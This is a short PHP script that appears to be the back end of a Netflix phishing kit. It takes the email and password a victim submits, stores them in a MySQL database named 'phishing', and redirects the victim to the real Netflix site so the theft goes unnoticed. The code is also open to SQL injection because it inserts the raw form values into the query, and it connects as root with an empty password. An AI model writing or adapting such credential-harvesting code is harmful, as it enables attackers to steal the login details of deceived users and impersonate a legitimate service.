<?php
$server = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($server, $username, $password, $dbname);

if (!$con) {
	echo "Connection failed";
}

$name = $_POST['email'];
$pass = $_POST['password'];

$sql = "INSERT INTO `netflix`(`email`, `password`) VALUES ('$name','$pass')";

$result = mysqli_query($con, $sql);
if ($result) {
	header('Location: https://www.netflix.com/');
} else {
	echo "Data not inserted";
}
